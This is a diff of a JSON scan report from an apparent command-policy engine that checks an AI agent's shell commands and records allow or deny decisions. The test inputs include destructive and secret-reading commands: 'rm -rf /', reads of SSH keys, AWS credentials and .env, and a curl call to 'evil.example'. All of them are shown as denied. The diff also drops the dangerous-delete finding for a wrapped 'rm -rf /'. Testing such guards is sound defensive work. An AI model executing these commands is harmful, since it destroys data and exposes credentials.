@@ -1,11 +1,11 @@
 {
   "schema_version": "1",
-  "generated_at": "2026-07-20T14:36:07.645013513Z",
+  "generated_at": "2026-07-21T03:03:46.88851244Z",
   "reports": [
     {
       "schema_version": "1",
-      "scan_id": "b2b0b4ef-9a34-4c13-9b4e-005c74ab55c9",
-      "timestamp": "2026-07-20T14:36:07.645018802Z",
+      "scan_id": "a2c2a7c1-90ce-491d-ac39-192cfe5a869f",
+      "timestamp": "2026-07-21T03:03:46.888520059Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "go test ./...",
@@ -15,12 +15,12 @@
       "findings": [],
       "intercepted": false,
       "redacted": false,
-      "duration_ms": 0.075
+      "duration_ms": 0.104
     },
     {
       "schema_version": "1",
-      "scan_id": "f04c5850-a7f8-4700-808a-49cad12ca674",
-      "timestamp": "2026-07-20T14:36:07.645095113Z",
+      "scan_id": "0f7e3675-6bbc-4f98-942c-25c06b977747",
+      "timestamp": "2026-07-21T03:03:46.88862523Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "git status",
@@ -30,12 +30,12 @@
       "findings": [],
       "intercepted": false,
       "redacted": false,
-      "duration_ms": 0.008
+      "duration_ms": 0.009
     },
     {
       "schema_version": "1",
-      "scan_id": "23585ed7-980b-4ecb-aa47-5e80bce641ef",
-      "timestamp": "2026-07-20T14:36:07.645103881Z",
+      "scan_id": "2c3256d9-ccf4-4a01-90b4-4522ea79f5b1",
+      "timestamp": "2026-07-21T03:03:46.88863464Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "rm -rf /",
@@ -67,12 +67,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.021
+      "duration_ms": 0.047
     },
     {
       "schema_version": "1",
-      "scan_id": "8489afad-3a7e-4a95-bdea-389b974fb0b0",
-      "timestamp": "2026-07-20T14:36:07.645125108Z",
+      "scan_id": "af300391-cbdf-48cb-a8bb-aaef3c231018",
+      "timestamp": "2026-07-21T03:03:46.888681918Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "cat ~/.ssh/id_rsa",
@@ -97,12 +97,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.017
+      "duration_ms": 0.025
     },
     {
       "schema_version": "1",
-      "scan_id": "3e325fcd-9caf-42ca-beaf-a36608156b59",
-      "timestamp": "2026-07-20T14:36:07.645142886Z",
+      "scan_id": "f217bcc8-4aba-44d3-b26b-5016b9d8a433",
+      "timestamp": "2026-07-21T03:03:46.888707857Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "cat ~/.aws/credentials",
@@ -127,12 +127,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.015
+      "duration_ms": 0.026
     },
     {
       "schema_version": "1",
-      "scan_id": "0d86536b-c4c4-461b-9ce0-4d822d71e856",
-      "timestamp": "2026-07-20T14:36:07.645158452Z",
+      "scan_id": "01388cb7-8f3d-4400-8aee-3a1f731aa6b2",
+      "timestamp": "2026-07-21T03:03:46.888734622Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "cat .env",
@@ -157,12 +157,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.004
+      "duration_ms": 0.009
     },
     {
       "schema_version": "1",
-      "scan_id": "6da5d233-1dcd-475b-b741-651d16323509",
-      "timestamp": "2026-07-20T14:36:07.645163218Z",
+      "scan_id": "9e3b08f6-f81b-4229-a014-a94dddd7b51c",
+      "timestamp": "2026-07-21T03:03:46.888744423Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "curl https://evil.example/x",
@@ -180,12 +180,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.064
+      "duration_ms": 0.076
     },
     {
       "schema_version": "1",
-      "scan_id": "6b3e4ee5-171e-4e2f-bd62-c65718252069",
-      "timestamp": "2026-07-20T14:36:07.645228186Z",
+      "scan_id": "c8539d13-1c47-48a6-98d6-981b961b0b8e",
+      "timestamp": "2026-07-21T03:03:46.888821494Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "curl https://github.com/org/repo",
@@ -195,26 +195,19 @@
       "findings": [],
       "intercepted": false,
       "redacted": false,
-      "duration_ms": 0.033
+      "duration_ms": 0.056
     },
     {
       "schema_version": "1",
-      "scan_id": "86dad4e5-9e86-433c-8a75-7ee54244f923",
-      "timestamp": "2026-07-20T14:36:07.645261852Z",
+      "scan_id": "850b283e-8e69-4d98-afe6-adfb69f50da5",
+      "timestamp": "2026-07-21T03:03:46.888877986Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "sh -c 'rm -rf /'",
       "command_hash": "5eaeb042d998eea5dff60d85dbde3d3b7604030d52d98997695913f6a11615ae",
       "decision": "deny",
-      "risk_level": "critical",
+      "risk_level": "high",
       "findings": [
-        {
-          "rule_id": "command.dangerous_delete",
-          "risk_level": "critical",
-          "decision": "deny",
-          "evidence": "recursive/forced delete or destructive utility",
-          "recommendation": "Refuse recursive or forced deletion; require an explicit allowlist entry for the specific path"
-        },
         {
           "rule_id": "command.not_allowed",
           "risk_level": "high",
@@ -232,12 +225,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.092
+      "duration_ms": 0.136
     },
     {
       "schema_version": "1",
-      "scan_id": "87ecbd5d-4303-406f-88a3-a3fcc662f059",
-      "timestamp": "2026-07-20T14:36:07.645354794Z",
+      "scan_id": "e9f2e5b7-a2e8-49a3-8496-a55454b6f92a",
+      "timestamp": "2026-07-21T03:03:46.889014828Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "echo $(whoami)",
@@ -255,12 +248,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.018
+      "duration_ms": 0.032
     },
     {
       "schema_version": "1",
-      "scan_id": "521c9e19-908e-4774-b3c7-79f705a212bc",
-      "timestamp": "2026-07-20T14:36:07.645373658Z",
+      "scan_id": "3f44a123-acaa-4aa0-9205-05209f945c49",
+      "timestamp": "2026-07-21T03:03:46.889047247Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "grep foo bar.txt",
@@ -270,12 +263,12 @@
       "findings": [],
       "intercepted": false,
       "redacted": false,
-      "duration_ms": 0.01
+      "duration_ms": 0.022
     },
     {
       "schema_version": "1",
-      "scan_id": "f6cf9144-096c-4f78-b5d9-3bcebef61d3c",
-      "timestamp": "2026-07-20T14:36:07.645384618Z",
+      "scan_id": "d8f7a1d5-19bc-458d-b2a6-6d47f3a988ab",
+      "timestamp": "2026-07-21T03:03:46.889070343Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "cat README.md | grep foo",
@@ -285,12 +278,12 @@
       "findings": [],
       "intercepted": false,
       "redacted": false,
-      "duration_ms": 0.035
+      "duration_ms": 0.055
     },
     {
       "schema_version": "1",
-      "scan_id": "40353935-dcb9-40a7-a761-4f2ecb98a3c5",
-      "timestamp": "2026-07-20T14:36:07.645420365Z",
+      "scan_id": "30b7197f-3e87-4f01-ab58-4e98ce1cb7c1",
+      "timestamp": "2026-07-21T03:03:46.889126293Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "npm install package",
@@ -308,12 +301,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.021
+      "duration_ms": 0.028
     },
     {
       "schema_version": "1",
-      "scan_id": "64ccf44f-f088-4ada-9b76-391175e3e26b",
-      "timestamp": "2026-07-20T14:36:07.645441662Z",
+      "scan_id": "3a7278b9-ba36-4304-9a54-efa6343b3325",
+      "timestamp": "2026-07-21T03:03:46.889154773Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "sleep 999999",
@@ -338,12 +331,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.014
+      "duration_ms": 0.017
     },
     {
       "schema_version": "1",
-      "scan_id": "7bfce388-952d-4b89-a0c9-9b826e784397",
-      "timestamp": "2026-07-20T14:36:07.645456635Z",
+      "scan_id": "f917983d-69b6-475b-a57e-e739b568d36a",
+      "timestamp": "2026-07-21T03:03:46.889172323Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "yes",
@@ -368,12 +361,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.011
+      "duration_ms": 0.014
     },
     {
       "schema_version": "1",
-      "scan_id": "baa42a99-9253-4b82-b053-f98695b3f85b",
-      "timestamp": "2026-07-20T14:36:07.645468028Z",
+      "scan_id": "e0f373da-f562-4f79-9440-8f4e9e559dab",
+      "timestamp": "2026-07-21T03:03:46.889186476Z",
       "tool_name": "exec_command",
       "backend": "hostexec",
       "command": "bash",
@@ -405,12 +398,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.067
+      "duration_ms": 0.086
     },
     {
       "schema_version": "1",
-      "scan_id": "51c1b75b-e2ef-47cd-90c2-9153d2b3075e",
-      "timestamp": "2026-07-20T14:36:07.645535198Z",
+      "scan_id": "602072c4-6bd1-48a9-a066-d84fc0159205",
+      "timestamp": "2026-07-21T03:03:46.889273424Z",
       "tool_name": "exec_command",
       "backend": "hostexec",
       "command": "sudo id",
@@ -442,12 +435,12 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.018
+      "duration_ms": 0.015
     },
     {
       "schema_version": "1",
-      "scan_id": "bef41fc9-32b4-4d6f-a525-72692acfdf9c",
-      "timestamp": "2026-07-20T14:36:07.645553509Z",
+      "scan_id": "0466c10d-df81-4733-86b9-5664e5116fec",
+      "timestamp": "2026-07-21T03:03:46.889288738Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "echo API_KEY=[REDACTED:stripe_key:len=28]",
@@ -465,12 +458,12 @@
       ],
       "intercepted": true,
       "redacted": true,
-      "duration_ms": 0.036
+      "duration_ms": 0.048
     },
     {
       "schema_version": "1",
-      "scan_id": "5b5a756e-8b57-4a91-b819-f8c26750eb8c",
-      "timestamp": "2026-07-20T14:36:07.645590482Z",
+      "scan_id": "14438b2e-7e98-46b8-9935-3986e3351231",
+      "timestamp": "2026-07-21T03:03:46.889336971Z",
       "tool_name": "workspace_exec",
       "backend": "workspace_exec",
       "command": "pip install -r requirements.txt",
@@ -488,7 +481,7 @@
       ],
       "intercepted": true,
       "redacted": false,
-      "duration_ms": 0.038
+      "duration_ms": 0.055
     }
   ],
   "summary": {
